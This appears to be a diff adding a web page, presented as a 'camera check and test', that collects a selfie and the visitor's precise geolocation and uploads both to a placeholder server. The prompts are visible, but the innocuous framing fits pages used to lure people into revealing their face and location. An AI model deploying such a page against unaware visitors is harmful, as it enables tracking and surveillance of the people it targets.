@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title> Camera check and test </title>
+<style>
+  body { font-family: Arial, sans-serif; max-width: 700px; margin: auto; padding: 20px; }
+  .card { padding: 15px; background: #f9f9f9; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 20px; }
+  video, canvas { width: 100%; max-width: 480px; border-radius: 8px; border: 1px solid #ccc; margin-top: 12px; }
+  button { padding: 12px 18px; margin-top: 10px; font-size: 16px; border: none; border-radius: 6px; background: #007bff; color: white; cursor: pointer; }
+  button:disabled { background: #999; cursor: not-allowed; }
+  #status { margin-top: 10px; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<h2>Camera check and test</h2>
+
+<div class="card">
+  This page will ask for:
+  <ul>
+    <li>Camera access</li>
+    <li>Location access</li>
+  </ul>
+  click your photo or just take selfie
+</div>
+
+<button id="startBtn">Start</button>
+
+<div id="captureArea" style="display:none;">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <p id="locationText">Location not fetched yet.</p>
+
+  <button id="snapBtn">Take Photo</button>
+  <button id="sendBtn" disabled>Send Photo & Location</button>
+  <button id="stopBtn">Stop</button>
+
+  <p id="status"></p>
+</div>
+
+<script>
+let stream = null;
+let photoBlob = null;
+let userLocation = null;
+
+const startBtn = document.getElementById('startBtn');
+const captureArea = document.getElementById('captureArea');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const snapBtn = document.getElementById('snapBtn');
+const sendBtn = document.getElementById('sendBtn');
+const stopBtn = document.getElementById('stopBtn');
+const locationText = document.getElementById('locationText');
+const statusBox = document.getElementById('status');
+
+// Start: Request permissions
+startBtn.onclick = async () => {
+  captureArea.style.display = 'block';
+  statusBox.textContent = "Requesting camera permission...";
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    statusBox.textContent = "Camera active.";
+  } catch (err) {
+    statusBox.textContent = "Camera permission denied.";
+    return;
+  }
+
+  statusBox.textContent = "Requesting location...";
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        userLocation = pos.coords;
+        locationText.textContent = `Location: ${userLocation.latitude.toFixed(6)}, ${userLocation.longitude.toFixed(6)}`;
+        statusBox.textContent = "You can now take a photo.";
+      },
+      err => {
+        locationText.textContent = "Location denied/unavailable.";
+        statusBox.textContent = "Location permission denied.";
+      }
+    );
+  }
+};
+
+// Capture photo
+snapBtn.onclick = () => {
+  canvas.style.display = "block";
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  canvas.toBlob(blob => {
+    photoBlob = blob;
+    if (userLocation) sendBtn.disabled = false;
+  }, "image/jpeg", 0.9);
+
+  statusBox.textContent = "Photo captured.";
+};
+
+// Send photo + location
+sendBtn.onclick = async () => {
+  if (!photoBlob || !userLocation) return;
+
+  statusBox.textContent = "Capturing...";
+
+  // 🚨 IMPORTANT: Replace this with your backend API URL
+  const uploadURL = "https://your-server.com/upload";
+
+  const formData = new FormData();
+  formData.append("photo", photoBlob, "photo.jpg");
+  formData.append("latitude", userLocation.latitude);
+  formData.append("longitude", userLocation.longitude);
+
+  try {
+    const res = await fetch(uploadURL, { method: "POST", body: formData });
+
+    if (res.ok) statusBox.textContent = "Upload successful.";
+    else statusBox.textContent = "Upload failed.";
+  } catch {
+    statusBox.textContent = "Network error.";
+  }
+};
+
+// Stop camera
+stopBtn.onclick = () => {
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+  }
+  captureArea.style.display = 'none';
+  statusBox.textContent = "Camera stopped.";
+};
+</script>
+
+</body>
+</html>
